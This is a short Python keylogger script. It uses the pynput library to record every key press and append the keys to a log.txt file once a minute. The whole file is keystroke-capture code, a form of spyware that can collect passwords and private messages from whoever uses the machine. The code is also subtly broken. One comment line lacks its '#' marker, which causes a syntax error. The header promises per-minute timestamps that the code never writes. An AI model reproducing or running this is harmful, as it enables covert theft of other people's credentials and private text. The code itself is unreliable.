
# -----------------------------------------------------------------------------------
#                       -- With Timestamp Per Minute --

import os
from pynput.keyboard import Listener
from threading import Timer                              

# Define the file path for logging
log_file = os.path.join(os.getcwd(), "log.txt")

# Mapping special keys to their desired outputs
key_map = {
    'Key.space': ' ',
    'Key.enter': '\n',
    'Key.shift_r': '',
    'Key.ctrl_l': ''
}

# Global variable to store captured keys
key_buffer = []

# Function to write the buffer to the file every minute
def write_buffer_to_file():
    global key_buffer
    if key_buffer:
        try:
            with open(log_file, 'a') as f:
                f.write(''.join(key_buffer))  # Write all keys in the buffer
            key_buffer = []  # Clear the buffer after writing
        except Exception as e:
            print(f"Error writing to log file: {e}")

    # Schedule the function to run again in 60 seconds
    Timer(60, write_buffer_to_file).start()

# Function to capture keystrokes
def write_to_buffer(key):
    global key_buffer
    try:
        letter = str(key).replace("'", "")  # Clean up the key representation
        letter = key_map.get(letter, letter)  # Replace based on the key map
        key_buffer.append(letter)  # Append the key to the buffer
    except Exception as e:
        print(f"Error logging key: {e}")

# Start the periodic file-writing function
write_buffer_to_file()

Start the listener to capture keystrokes
with Listener(on_press=write_to_buffer) as listener:
    listener.join()
